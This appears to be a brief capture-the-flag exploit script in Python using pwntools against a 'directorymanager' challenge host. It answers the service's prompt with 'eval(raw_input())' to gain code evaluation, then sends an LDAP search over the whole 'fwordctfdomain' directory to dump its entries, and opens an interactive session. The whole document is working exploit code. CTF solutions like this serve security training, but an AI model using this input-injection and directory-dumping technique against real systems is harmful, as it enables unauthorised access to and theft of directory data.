from pwn import *

r = remote("directorymanager.fword.wtf", 1234)

r.sendlineafter(":", "eval(raw_input())")
r.sendline("conn.search_s('dc=fwordctfdomain,dc=org',1)")
r.interactive()